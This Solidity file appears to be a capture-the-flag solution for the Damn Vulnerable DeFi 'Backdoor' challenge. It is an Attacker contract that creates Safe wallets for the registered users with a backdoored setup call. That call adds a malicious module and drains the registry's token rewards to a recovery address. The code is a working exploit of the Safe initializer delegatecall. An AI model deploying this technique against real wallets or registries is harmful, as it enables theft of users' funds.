// SPDX-License-Identifier: MIT
pragma solidity = 0.8.25;
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {IProxyCreationCallback} from "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
import "safe-smart-account/contracts/common/Enum.sol";
import {Destroyer} from "./Destroyer.sol";
import {Evil} from "./Evil.sol";

contract Attacker {
    constructor(SafeProxyFactory walletFactory, WalletRegistry walletRegistry, address singleton, DamnValuableToken token, address[] memory users, address recovery) {
        Destroyer destroyer = new Destroyer();
        Evil evil = new Evil();
        bytes memory initializer;
        address[] memory owner = new address[](1);
        for (uint256 i = 0; i < 4; i++) {
            owner[0] = users[i];
            initializer = abi.encodeCall(Safe.setup, (owner, 1, address(evil), abi.encodeCall(evil.addModule, (address(destroyer))), address(0), address(0), 0, payable(address(0))));
            destroyer.attack(walletFactory, singleton, initializer, i, IProxyCreationCallback(address(walletRegistry)), token);
        }
        token.transfer(recovery, 40e18);
    }
}